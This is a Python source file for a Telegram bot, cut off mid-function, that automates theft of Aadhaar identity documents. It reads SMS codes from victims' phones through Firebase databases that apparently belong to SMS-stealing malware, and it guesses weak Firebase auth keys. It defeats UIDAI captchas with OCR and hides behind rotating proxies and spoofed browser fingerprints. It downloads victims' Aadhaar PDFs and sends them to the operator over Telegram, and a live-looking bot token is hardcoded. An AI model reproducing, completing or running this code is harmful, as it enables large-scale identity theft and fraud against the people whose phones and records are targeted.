"""
╔══════════════════════════════════════════════════╗
║          AUTO-OTP BOT v2.0                       ║
║   Firebase → Auto Number → Auto OTP → PDF Drop   ║
╚══════════════════════════════════════════════════╝

Commands:
  /addfire URL:AUTH       - Add single Firebase DB
  /addfire (bulk paste)   - Add multiple Firebase DBs (one per line)
  /removefire URL         - Remove a Firebase DB
  /removefire all         - Remove all Firebase DBs
  /listfire               - List all added Firebase DBs with status
  /scan                   - Scan all DBs and show online devices
  /debugscan              - Deep debug scan (clients + top-level keys)
  /debugusers             - Inspect user/phone paths
  /debugmsgs <deviceId>   - Show last messages for one device
  /auto [count]           - Start auto-OTP for N numbers (default 5)
  /stopauto               - Stop running auto-OTP
  /resetused              - Reset used numbers list
  /reloadproxy            - Reload proxies.txt
  /proxystatus            - Show loaded proxy count
  /testproxy              - Test first 3 proxies
  /status                 - Show bot status
  /help                   - Show commands
"""

import requests
import json
import base64
import uuid
import re
import os
import sys
import time
import logging
import threading
import random
from io import BytesIO

if sys.platform == "win32":
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

# ============== CONFIG ==============
BOT_TOKEN = "8800949076:AAHnyQb6YYbCs98KZyl7uhDfsv2jdHlgFEo"
OWNER_IDS = {8337013809}
BOT_NAME = "⚡ Auto-OTP Bot"
DIVIDER = "━━━━━━━━━━━━━━━"
NAME_API = "https://sarkariupdate.online/osint/APIX.php?api=num_api&q="
PROXY_FILE = "proxies.txt"
PROXY_POOL = []

# OTP wait time (seconds)
OTP_WAIT_SECONDS = 60

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger("AutoOTP")

# ============== PROXY LOADER ==============
def load_proxies():
    global PROXY_POOL
    PROXY_POOL = []
    here = os.path.dirname(os.path.abspath(__file__))
    cwd  = os.getcwd()
    candidates = [PROXY_FILE, os.path.join(here, PROXY_FILE),
                  os.path.join(cwd, PROXY_FILE), "/app/proxies.txt"]
    found_path = None
    for p in candidates:
        if os.path.exists(p):
            found_path = p; break
    if not found_path:
        logger.warning(f"[PROXY] not found. cwd={cwd}")
        return
    logger.info(f"[PROXY] using {found_path} ({os.path.getsize(found_path)} bytes)")
    try:
        with open(found_path, 'r', encoding='utf-8-sig', errors='ignore') as f:
            content = f.read()
    except Exception as e:
        logger.error(f"[PROXY] read error: {e}"); return
    for i, raw in enumerate(content.splitlines(), 1):
        line = raw.strip().strip('\ufeff')
        if not line or line.startswith('#'): continue
        proxy = None
        if '://' in line:
            proxy = line
        elif '@' in line:
            proxy = f"http://{line}"
        else:
            parts = line.split(':')
            if len(parts) == 2:
                proxy = f"http://{parts[0]}:{parts[1]}"
            elif len(parts) == 4:
                host, port, user, pwd = parts
                proxy = f"http://{user}:{pwd}@{host}:{port}"
            else:
                logger.warning(f"[PROXY] line {i}: invalid ({len(parts)} parts)"); continue
        PROXY_POOL.append(proxy)
        logger.info(f"[PROXY] line {i}: ✅ ...@{proxy.split('@')[-1]}")
    logger.info(f"[PROXY] === loaded {len(PROXY_POOL)} proxies ===")


def test_proxy(proxy, timeout=12):
    try:
        r = requests.get("https://api.ipify.org?format=json",
                         proxies={"http": proxy, "https": proxy}, timeout=timeout)
        if r.status_code == 200:
            return True, f"exit IP {r.json().get('ip','?')}"
        return False, f"HTTP {r.status_code}"
    except Exception as e:
        return False, f"{type(e).__name__}: {str(e)[:80]}"


# ============== STATE ==============
firebase_dbs = []
firebase_lock = threading.Lock()
used_numbers = set()
used_lock = threading.Lock()
auto_running = {}
_pending_urls = {}
_tg_session = None

# ============== OCR ==============
try:
    import ddddocr
    ocr_solver = ddddocr.DdddOcr(show_ad=False)
    ocr_solver_beta = ddddocr.DdddOcr(beta=True, show_ad=False)
    print("[OCR] loaded OK", flush=True)
except Exception as e:
    print(f"[OCR] FAILED: {e}", flush=True)
    ocr_solver = ocr_solver_beta = None

# ============== FINGERPRINT ==============
UA_POOL = [
    ('Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 Chrome/131.0.0.0 Mobile Safari/537.36', '"Google Chrome";v="131"', '"Android"'),
    ('Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/130.0.0.0 Mobile Safari/537.36', '"Google Chrome";v="130"', '"Android"'),
    ('Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 Safari/604.1', '"Safari";v="18"', '"iOS"'),
    ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36', '"Google Chrome";v="131"', '"Windows"'),
]
SCREEN_POOL = ['360x800','393x873','412x915','414x896','390x844','375x812','1920x1080']

def get_fp():
    ua, ch, pl = random.choice(UA_POOL)
    w, h = random.choice(SCREEN_POOL).split('x')
    mob = '?1' if 'Mobile' in ua or 'Android' in ua or 'iPhone' in ua else '?0'
    return {'User-Agent':ua,'sec-ch-ua':f'{ch},"Chromium";v="131","Not)A;Brand";v="24"','sec-ch-ua-mobile':mob,'sec-ch-ua-platform':pl,'viewport-width':w,'device-memory':str(random.choice([2,4,8])),'dnt':str(random.choice([0,1]))}

# ============== SESSION ==============
def get_sess():
    s = requests.Session()
    s.mount('https://', requests.adapters.HTTPAdapter(pool_connections=5, pool_maxsize=5, max_retries=1, pool_block=False))
    if PROXY_POOL:
        p = random.choice(PROXY_POOL)
        s.proxies = {'http': p, 'https': p}
    return s

# ============== TELEGRAM ==============
def tg():
    global _tg_session
    if not _tg_session:
        _tg_session = requests.Session()
    return _tg_session

def send_msg(cid, text, rm=None):
    d = {'chat_id':cid,'text':text,'parse_mode':'HTML','disable_web_page_preview':True}
    if rm: d['reply_markup'] = json.dumps(rm)
    try: return tg().post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json=d, timeout=15).json()
    except: return {}

def edit_msg(cid, mid, text):
    try: tg().post(f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText", json={'chat_id':cid,'message_id':mid,'text':text,'parse_mode':'HTML','disable_web_page_preview':True}, timeout=10)
    except: pass

def send_doc(cid, path, caption="", fname="Aadhaar.pdf"):
    try:
        with open(path,'rb') as f:
            return tg().post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument", data={'chat_id':cid,'caption':caption,'parse_mode':'HTML'}, files={'document':(fname,f)}, timeout=60).json()
    except: return {}

def get_updates(offset=None):
    p = {'timeout':30,'allowed_updates':['message']}
    if offset: p['offset'] = offset
    try:
        r = tg().get(f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates", params=p, timeout=40)
        d = r.json()
        if d.get('ok'): return d.get('result',[])
    except Exception as e:
        logger.error(f"Updates: {e}")
        time.sleep(5)
    return []

# ============== UIDAI ==============
BH = {'Accept':'application/json, text/plain, */*','Accept-Language':'en_IN','Content-Type':'application/json','Origin':'https://myaadhaar.uidai.gov.in','Referer':'https://myaadhaar.uidai.gov.in/','Sec-Fetch-Dest':'empty','Sec-Fetch-Mode':'cors','Sec-Fetch-Site':'same-site','appid':'MYAADHAAR'}

def get_captcha(retries=3):
    for i in range(1, retries+1):
        tid = str(uuid.uuid4())
        try:
            s = get_sess()
            s.headers.update({**BH, **get_fp(), 'x-request-id':tid, 'transactionId':tid})
            r = s.post('https://tathya.uidai.gov.in/audioCaptchaService/api/captcha/v3/generation', json={'captchaLength':'6','captchaType':'2','audioCaptchaRequired':True}, timeout=45)
            if r.status_code != 200: continue
            rj = r.json()
            ctxn = rj.get('transactionId')
            cb64 = rj.get('imageBase64')
            if not cb64:
                for k,v in rj.items():
                    if isinstance(v,str) and len(v)>100: cb64=v; break
            if not cb64: continue
            if cb64.startswith('data:image'): cb64=cb64.split(',')[1]
            return base64.b64decode(cb64), ctxn, tid
        except Exception as e:
            logger.warning(f"Captcha {i}: {e}")
            time.sleep(0.5)
    return None,None,None

def solve_cap(img):
    if not ocr_solver_beta: return ""
    try:
        import io
        from PIL import Image, ImageFilter, ImageEnhance, ImageOps
        im = Image.open(io.BytesIO(img))
        if im.mode!='L': im=im.convert('L')
        w,h=im.size; im=im.resize((w*2,h*2),Image.LANCZOS)
        im=im.filter(ImageFilter.MedianFilter(3))
        im=ImageEnhance.Contrast(im).enhance(2.0)
        im=ImageEnhance.Sharpness(im).enhance(2.0)
        im=im.point(lambda p:255 if p>140 else 0)
        im=ImageOps.autocontrast(im,cutoff=5)
        buf=io.BytesIO(); im.save(buf,format='PNG')
        r=ocr_solver_beta.classification(buf.getvalue())
        if r and len(r)>=4:
            r=''.join(c for c in r if c.isalnum())
            if len(r)>=4: return r[:6]
    except: pass
    try: return ocr_solver.classification(img)
    except: return ""

def send_eid_otp(mob, name, cap, ctxn, tid):
    s=get_sess(); s.headers.update({**BH,**get_fp(),'x-request-id':tid,'transactionId':tid})
    d={'mobileNumber':mob,'dob':None,'email':None,'name':name.upper(),'option':'EID','otp':None,'otpTxnId':None,'captchaTxnId':ctxn,'captcha':cap,'resendOtp':False}
    try:
        r=s.post('https://tathya.uidai.gov.in/retrieveEidUid/ext/v1/generic/retrieveuideid',json=d,timeout=30)
        if r.status_code==200:
            rj=r.json()
            if 'responseData' in rj:
                rd=rj['responseData']
                if rd.get('otpTxnId') and rd.get('status')=="Success": return True,rd['otpTxnId'],None
                return False,None,rd.get('message','Error')
            return False,None,'Bad response'
        return False,None,f'HTTP {r.status_code}'
    except Exception as e: return False,None,str(e)

def verify_eid(mob,name,otp,otxn,ctxn,cap):
    s=get_sess(); s.headers.update({**BH,**get_fp(),'x-request-id':str(uuid.uuid4())})
    d={'mobileNumber':mob,'dob':None,'name':name.upper(),'email':None,'option':'EID','otp':otp,'otpTxnId':otxn,'captchaTxnId':ctxn,'captcha':cap,'resendOtp':False}
    try:
        r=s.post('https://tathya.uidai.gov.in/retrieveEidUid/ext/v1/generic/retrieveuideid',json=d,timeout=60)
        if r.status_code==200:
            rj=r.json()
            if rj.get('status') in [200,"Success"] and 'responseData' in rj:
                rd=rj['responseData']; eid=rd.get('eidNumber'); nm=rd.get('name',name)
                if eid: return True,eid,nm
                return False,None,"No EID"
            ed=rj.get('errorDetails')
            if isinstance(ed,dict): return False,None,ed.get('messageEnglish','Failed')
            return False,None,rj.get('message','Failed')
        return False,None,f'HTTP {r.status_code}'
    except Exception as e: return False,None,str(e)

def send_aadh_otp(eid,cap,ctxn,tid):
    s=get_sess(); s.headers.update({**BH,**get_fp(),'x-request-id':tid,'transactionId':tid})
    d={'eidNumber':eid,'idType':'eid','captchaTxnId':ctxn,'captchaValue':cap,'transactionId':tid,'resendOTP':False}
    try:
        r=s.post('https://tathya.uidai.gov.in/unifiedAppAuthService/api/v2/generate/aadhaar/otp',json=d,timeout=45)
        if r.status_code==200:
            rj=r.json(); txn=rj.get('txnId')
            if txn and rj.get('status')=="Success": return True,txn,None
            return False,None,rj.get('message','Failed')
        return False,None,f'HTTP {r.status_code}'
    except Exception as e: return False,None,str(e)

def dl_pdf(eid,otp,otxn,tid):
    s=get_sess(); s.headers.update({**BH,**get_fp(),'x-request-id':tid,'transactionId':tid})
    d={'eid':eid,'mask':False,'otp':otp,'otpTxnId':otxn}
    try:
        r=s.post('https://tathya.uidai.gov.in/downloadAadhaarService/api/aadhaar/download',json=d,timeout=90)
        if r.status_code==200:
            rj=r.json()
            for k,v in rj.items():
                if isinstance(v,str) and len(v)>1000:
                    try:
                        dec=base64.b64decode(v)
                        if dec[:4]==b'%PDF' or dec[:5]==b'%PDF-':
                            fp=os.path.join(os.path.dirname(os.path.abspath(__file__)),f"aadh_{int(time.time())}.pdf")
                            with open(fp,'wb') as f: f.write(dec)
                            return True,fp
                    except: continue
            return False,rj.get('message',rj.get('errorMessage','No PDF'))
        return False,f'HTTP {r.status_code}'
    except Exception as e: return False,str(e)

# ============== FIREBASE — PHONE HELPERS ==============
def _looks_like_phone(s):
    """Return normalized 10-digit Indian mobile or None."""
    if s is None: return None
    if isinstance(s, (int, float)):
        s = str(int(s))
    d = re.sub(r'[^0-9]', '', str(s))
    if len(d) == 12 and d.startswith('91'): d = d[2:]
    if len(d) == 11 and d.startswith('0'): d = d[1:]
    if len(d) == 10 and re.match(r'^[6-9]\d{9}$', d): return d
    return None


def _phone_from_any(obj, depth=0):
    """Recursively look for a phone-looking value under known keys."""
    if depth > 4 or not isinstance(obj, dict): return None
    # Direct keys first
    for k in ("to","number","phone","phoneNumber","mobNo","mobile","num",
              "msisdn","contact","user","recipient","target","destination",
              "Phone","Mobile","PhoneNumber","MobNo"):
        if k in obj:
            p = _looks_like_phone(obj[k])
            if p: return p
    # Nested one level deeper
    for k in ("commands","sendSms","send_sms","sms","smsCommand",
              "webhookEvent","action","command","data","info","client","device"):
        if k in obj and isinstance(obj[k], dict):
            p = _phone_from_any(obj[k], depth+1)
            if p: return p
    return None


def _is_online(dd):
    if not isinstance(dd, dict): return False
    st = dd.get("status")
    if st is True or st == 1: return True
    if isinstance(st, str) and st.strip().lower() in ("true","1","online","on","active","yes","connected"):
        return True
    return False


def fb_scan():
    """Scan all DBs. HARD-dedupe by phone (one row per unique number).

    The `seen` dict is keyed by phone string, so duplicates are
    mathematically impossible to appear in the output.
    """
    seen = {}   # phone -> best candidate info

    with firebase_lock: dbs = list(firebase_dbs)
    logger.info(f"[SCAN] === scanning {len(dbs)} DB(s) ===")

    for db in dbs:
        url = db['url'].rstrip('/'); auth = db['auth']

        # /clients
        try:
            r = requests.get(f"{url}/clients.json?auth={auth}", timeout=12)
            clients = r.json() if r.status_code == 200 else None
        except Exception as e:
            logger.warning(f"[SCAN] clients fetch failed for {url}: {e}")
            clients = None
        if not isinstance(clients, dict) or not clients:
            logger.warning(f"[SCAN] {url} -> no clients")
            continue

        online_count = 0
        with_phone = 0

        for did, dd in clients.items():
            if not isinstance(dd, dict): continue
            if not _is_online(dd): continue
            online_count += 1

            ph = _phone_from_any(dd)
            if not ph: continue
            with_phone += 1

            last_ts = 0
            for k in ("lastMessageTime","last_message_time","lastSeen","timestamp"):
                v = dd.get(k)
                if isinstance(v, (int, float)) and v > last_ts:
                    last_ts = int(v)

            batt_raw = str(dd.get("battery","")).replace("%","").strip()
            try: batt = int(batt_raw) if batt_raw else 0
            except: batt = 0

            prev = seen.get(ph)
            if prev is None or (last_ts, batt) > (prev["last_ts"], prev["batt"]):
                seen[ph] = {
                    "db_url": url, "db_auth": auth,
                    "dev_id": did, "phone": ph,
                    "battery": str(dd.get("battery","?"))[:6],
                    "last_ts": last_ts, "batt": batt,
                }

        logger.info(f"[SCAN] {url.split('//')[-1][:40]} online={online_count} with_phone={with_phone}")

    # Build final list, filter used
    devs = []
    with used_lock:
        for ph, info in seen.items():
            if ph in used_numbers: continue
            devs.append({
                "db_url": info["db_url"], "db_auth": info["db_auth"],
                "dev_id": info["dev_id"], "phone": info["phone"],
                "phone_display": info["phone"],
                "battery": info["battery"],
            })

    logger.info(f"[SCAN] === unique online phones: {len(seen)} | after used-filter: {len(devs)} ===")
    for ph, info in list(seen.items())[:10]:
        logger.info(f"[SCAN]   {ph}  dev={info['dev_id'][:14]}  batt={info['battery']}")

    return devs


def fb_msgids(url,auth,did):
    try:
        r = requests.get(f"{url}/messages/{did}.json?auth={auth}&shallow=true", timeout=8)
        if r.status_code == 200 and r.json(): return set(r.json().keys())
    except: pass
    return set()


def fb_otp(url,auth,did,existing,timeout=OTP_WAIT_SECONDS):
    t0=time.time()
    while time.time()-t0<timeout:
        try:
            r=requests.get(f"{url}/messages/{did}.json?auth={auth}&orderBy=%22%24key%22&limitToLast=20",timeout=8)
            if r.status_code==200 and r.json():
                ms=r.json()
                if isinstance(ms,dict):
                    for mid,md in sorted(ms.items(),reverse=True):
                        if mid in existing: continue
                        if not isinstance(md,dict): continue
                        body=str(md.get("message","") or md.get("body","") or md.get("msg","") or md.get("text","") or "")
                        for o in re.findall(r'\b(\d{6})\b',body):
                            if o not in ["000000","123456","111111","999999"]: return o
        except: pass
        time.sleep(3)
    return None

# ============== AUTO WORKER ==============
def auto_worker(cid, count):
    stop=auto_running.get(cid)
    done=0; wins=0
    with firebase_lock: dbc=len(firebase_dbs)
    if dbc==0:
        send_msg(cid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗  No Firebase DBs!\n<i>/addfire URL:AUTH</i>")
        auto_running.pop(cid,None); return

    send_msg(cid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>〔 🚀 AUTO-OTP Started 〕</b>\n\n◈  Target · {count} PDFs\n◈  Firebase · {dbc} DBs\n◈  Proxies · {len(PROXY_POOL)}\n<i>◌  Scanning...</i>")
    devs=fb_scan()
    if not devs:
        send_msg(cid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗  No online devices.\n\n<i>Run /debugscan and /debugusers.</i>")
        auto_running.pop(cid,None); return

    send_msg(cid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>📱 {len(devs)} Devices</b>\n◈  Processing {min(count,len(devs))}...\n<i>◌  Running...</i>")

    for dev in devs[:count]:
        if stop and stop.is_set(): send_msg(cid,f"{BOT_NAME}\n{DIVIDER}\n✗ Stopped."); break
        mob=dev["phone"]
        with used_lock:
            if mob in used_numbers: continue
            used_numbers.add(mob)
        done+=1
        dbn=dev["db_url"].split("//")[1].split("-default")[0]

        m=send_msg(cid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>〔 #{done} 〕</b>\n\n◈ 📱 {mob}\n◈ 🔋 {dev['battery']}% | 💾 {dbn}\n<i>◌ Fetching name...</i>")
        mid=m.get('result',{}).get('message_id')

        name="MR"
        try:
            r=requests.get(f"{NAME_API}{mob}",timeout=8)
            if r.status_code==200:
                fn=r.json().get('name','').strip()
                if fn and fn.lower() not in ['unknown','n/a','']: name=fn.upper()
        except: pass

        if mid: edit_msg(cid,mid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>〔 #{done} 〕</b> {mob} | {name}\n<i>◌ Captcha...</i>")

        eids=fb_msgids(dev["db_url"],dev["db_auth"],dev["dev_id"])

        sent=False; etxn=cs=ct=None; lerr=""
        for a in range(1,6):
            if stop and stop.is_set(): break
            if mid: edit_msg(cid,mid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>〔 #{done} 〕</b> {mob} | {name}\n<i>◌ Captcha {a}/5...</i>")
            img,cx,tx=get_captcha()
            if not img: lerr="Captcha unavailable"; time.sleep(1); continue
            code=solve_cap(img)
            if not code: lerr="Captcha unsolved"; continue
            ok,txn,err=send_eid_otp(mob,name,code,cx,tx)
            if ok: sent=True; etxn=txn; cs=code; ct=cx; break
            else:
                lerr=err or "Unknown"
                if "captcha" not in str(err).lower() and "invalid" not in str(err).lower(): break
                time.sleep(1)

        if not sent:
            if mid: edit_msg(cid,mid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>〔 #{done} ✗ 〕</b>\n◈ {mob}\n✗ OTP failed: {lerr}")
            continue

        wait_min = max(1, OTP_WAIT_SECONDS // 60)
        if mid: edit_msg(cid,mid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>〔 #{done} 〕</b> {mob} | {name}\n✓ OTP sent!\n<i>◌ Waiting SMS ({wait_min}min)...</i>")
        otp=fb_otp(dev["db_url"],dev["db_auth"],dev["dev_id"],eids,OTP_WAIT_SECONDS)
        if not otp:
            if mid: edit_msg(cid,mid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>〔 #{done} ✗ 〕</b>\n◈ {mob}\n✗ No OTP received")
            continue

        if mid: edit_msg(cid,mid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>〔 #{done} 〕</b> {mob} | OTP:{otp}\n<i>◌ Verifying EID...</i>")
        ok2,eid,vn=verify_eid(mob,name,otp,etxn,ct,cs)
        if not ok2:
            if mid: edit_msg(cid,mid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>〔 #{done} ✗ 〕</b>\n◈ {mob}\n✗ EID failed: {vn}")
            continue
        if not vn or not vn.strip(): vn=name

        if mid: edit_msg(cid,mid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>〔 #{done} 〕</b> {vn}\n◈ EID: {eid}\n<i>◌ PDF OTP...</i>")
        eids2=fb_msgids(dev["db_url"],dev["db_auth"],dev["dev_id"])
        psent=False; ptxn=t2=None
        for a in range(1,6):
            if stop and stop.is_set(): break
            i2,c2,t2=get_captcha()
            if not i2: time.sleep(1); continue
            cd2=solve_cap(i2)
            if not cd2: continue
            o3,tx3,m3=send_aadh_otp(eid,cd2,c2,t2)
            if o3: psent=True; ptxn=tx3; break
            if "captcha" not in str(m3).lower(): break
            time.sleep(1)

        if not psent:
            if mid: edit_msg(cid,mid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>〔 #{done} ✗ 〕</b>\n◈ {mob} | EID:{eid}\n✗ PDF OTP failed")
            continue

        if mid: edit_msg(cid,mid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>〔 #{done} 〕</b> {vn} | EID:{eid}\n<i>◌ Waiting PDF OTP ({wait_min}min)...</i>")
        potp=fb_otp(dev["db_url"],dev["db_auth"],dev["dev_id"],eids2,OTP_WAIT_SECONDS)
        if not potp:
            if mid: edit_msg(cid,mid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>〔 #{done} ✗ 〕</b>\n◈ {mob}\n✗ PDF OTP timeout")
            continue

        if mid: edit_msg(cid,mid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>〔 #{done} 〕</b> {vn}\n◈ EID:{eid} OTP:{potp}\n<i>◌ Downloading PDF...</i>")
        try:
            o4,res=dl_pdf(eid,potp,ptxn,t2)
            if o4 and res and '.pdf' in res:
                if mid: edit_msg(cid,mid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>〔 #{done} ✅ 〕</b>\n◈ 📱 {mob}\n◈ 👤 {vn}\n◈ 🆔 {eid}\n<i>◌ Sending...</i>")
                send_doc(cid,res,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>✅ Aadhaar PDF</b>\n\n◈ Name · {vn}\n◈ Phone · {mob}\n◈ EID · {eid}")
                wins+=1
                try: os.remove(res)
                except: pass
            else:
                if mid: edit_msg(cid,mid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>〔 #{done} ✗ 〕</b>\n✗ Download: {res}")
        except Exception as e:
            if mid: edit_msg(cid,mid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ Error: {str(e)[:100]}")

    send_msg(cid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>🏁 Complete</b>\n\n◈ Processed · {done}\n◈ Success · {wins} PDFs\n\n<i>/auto again | /resetused</i>")
    auto_running.pop(cid,None)

# ============== COMMANDS ==============
def handle(cid, text):
    if int(cid) not in OWNER_IDS:
        send_msg(cid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ Access denied."); return

    parts=text.strip().split(None,1)
    cmd=parts[0].lower()

    if cmd in ['/help','/start']:
        send_msg(cid,
            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>〔 Commands 〕</b>\n\n"
            f"🔥 <b>Firebase:</b>\n"
            f"  /addfire <code>URL:AUTH</code>\n"
            f"  /removefire <code>URL</code> | all\n"
            f"  /listfire\n\n"
            f"📱 <b>Auto-OTP:</b>\n"
            f"  /scan — Online devices (unique)\n"
            f"  /debugscan — Inspect /clients + top keys\n"
            f"  /debugusers — Inspect user/phone paths\n"
            f"  /debugmsgs <code>&lt;deviceId&gt;</code> — Show messages\n"
            f"  /auto [N] — Process N numbers\n"
            f"  /stopauto\n"
            f"  /resetused\n\n"
            f"🌐 <b>Proxy:</b>\n"
            f"  /reloadproxy\n"
            f"  /proxystatus\n"
            f"  /testproxy\n\n"
            f"⚙️ <b>Other:</b>\n"
            f"  /status\n"
            f"  /help")

    elif cmd=='/addfire':
        if len(parts)<2:
            send_msg(cid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ Usage:\n<code>/addfire URL:AUTH</code>\n\nOr just URLs (auto-tests auth):\n<code>/addfire\nURL1\nURL2</code>"); return
        raw=parts[1].strip(); lines=[l.strip() for l in raw.split('\n') if l.strip()]
        added=0; need_auth=[]

        status = send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<i>◌ Processing {len(lines)} URL(s)...</i>")
        sid = status.get('result',{}).get('message_id')

        for line in lines:
            if 'firebaseio.com' not in line and 'firebasedatabase.app' not in line: continue
            has_auth = False; url = line; auth = ""
            idx=line.rfind(':')
            while idx>0 and line[idx-1]=='/': idx=line.rfind(':',0,idx-1)
            if idx>10:
                pu = line[:idx].strip(); pa = line[idx+1:].strip()
                if pa and ('firebaseio.com' in pu or 'firebasedatabase.app' in pu):
                    url=pu; auth=pa; has_auth=True
            if not url.startswith('http'): url='https://'+url

            with firebase_lock:
                if any(d['url']==url for d in firebase_dbs): continue

            if has_auth:
                with firebase_lock: firebase_dbs.append({"url":url,"auth":auth}); added+=1
            else:
                test_auths = ["123456","Very","test","737374","373747","1234","admin","12345","B"]
                found = False
                for ta in test_auths:
                    try:
                        r = requests.get(f"{url}/clients.json?auth={ta}", timeout=6)
                        if r.status_code == 200:
                            with firebase_lock: firebase_dbs.append({"url":url,"auth":ta}); added+=1
                            found = True; break
                    except: continue
                if not found:
                    try:
                        r = requests.get(f"{url}/clients.json", timeout=6)
                        if r.status_code == 200:
                            with firebase_lock: firebase_dbs.append({"url":url,"auth":""}); added+=1
                            found = True
                    except: pass
                if not found:
                    need_auth.append(url)

        if need_auth:
            _pending_urls[cid] = need_auth
            names = "\n".join([u.split('//')[1].split('-default')[0] if '-default' in u else u[:40] for u in need_auth])
            msg_text = f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
            if added: msg_text += f"✅ {added} DB(s) added (open/auto-auth)\n\n"
            msg_text += f"<b>🔒 {len(need_auth)} DB(s) need auth:</b>\n<code>{names}</code>\n\n<i>◌ Send auth key:</i>"
            if sid: edit_msg(cid, sid, msg_text)
            else: send_msg(cid, msg_text)
        else:
            with firebase_lock: total=len(firebase_dbs)
            msg_text = f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✅ Added {added} DB(s)\n📊 Total: {total}"
            if sid: edit_msg(cid, sid, msg_text)
            else: send_msg(cid, msg_text)

    elif cmd=='/removefire':
        if len(parts)<2:
            send_msg(cid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ /removefire URL or /removefire all"); return
        t=parts[1].strip().lower()
        if t=='all':
            with firebase_lock: c=len(firebase_dbs); firebase_dbs.clear()
            send_msg(cid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✅ Removed all {c} DBs.")
        else:
            with firebase_lock:
                b=len(firebase_dbs); firebase_dbs[:] = [d for d in firebase_dbs if t not in d['url'].lower()]; rm=b-len(firebase_dbs)
            send_msg(cid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✅ Removed {rm}. Left: {len(firebase_dbs)}")

    elif cmd=='/listfire':
        with firebase_lock: dbs=list(firebase_dbs)
        if not dbs: send_msg(cid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ Empty.\n<i>/addfire URL:AUTH</i>"); return
        ls=[f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>〔 Firebase ({len(dbs)}) 〕</b>\n"]
        for i,d in enumerate(dbs,1):
            n=d['url'].split('//')[1].split('-default')[0] if '-default' in d['url'] else d['url'][:40]
            ls.append(f"{i}. <code>{n}</code> | auth={d['auth'][:10]}")
        send_msg(cid,"\n".join(ls))

    elif cmd=='/scan':
        with firebase_lock:
            if not firebase_dbs: send_msg(cid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ No DBs. /addfire"); return
        send_msg(cid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<i>◌ Scanning...</i>")
        devs=fb_scan()
        if not devs:
            send_msg(cid,f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ No online devices.\n\n<i>Run /debugscan and /debugusers.</i>")
            return
        ls=[f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>📱 Online Devices (unique)</b>\n"]
        for i,d in enumerate(devs[:50],1):
            dn=d["db_url"].split("//")[1].split("-default")[0]
            ls.append(f"{i}. <code>{d['phone']}</code> | 🔋{d['battery']} | {dn}")
        ls.append(f"\n<b>Total: {len(devs)}</b>\n<i>/auto {len(devs)}</i>")
        send_msg(cid,"\n".join(ls))

    elif cmd=='/debugscan':
        with firebase_lock: dbs = list(firebase_dbs)
        if not dbs:
            send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ No DBs added. /addfire first.")
            return
        report = [f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>🔍 Debug Scan</b>"]

        for db in dbs:
            url = db['url'].rstrip('/'); auth = db['auth']
            short = url.split('//')[-1].split('-default')[0][:40]
            report.append(f"\n<b>DB:</b> <code>{short}</code>")
            report.append(f"◈ auth: <code>{auth[:15]}</code>")

            try:
                r = requests.get(f"{url}/clients.json?auth={auth}", timeout=10)
                report.append(f"◈ /clients.json → HTTP {r.status_code}")
                if r.status_code == 200:
                    data = r.json()
                    if isinstance(data, dict):
                        report.append(f"◈ keys under /clients: <b>{len(data)}</b>")
                        online = sum(1 for d in data.values() if _is_online(d))
                        report.append(f"◈ status:true count: <b>{online}</b>")
                    elif isinstance(data, list):
                        report.append(f"◈ /clients is a LIST of {len(data)} items")
                else:
                    report.append(f"◈ body: <code>{r.text[:150]}</code>")
            except Exception as e:
                report.append(f"◈ ERROR: {str(e)[:120]}")

            try:
                r2 = requests.get(f"{url}/.json?auth={auth}&shallow=true", timeout=10)
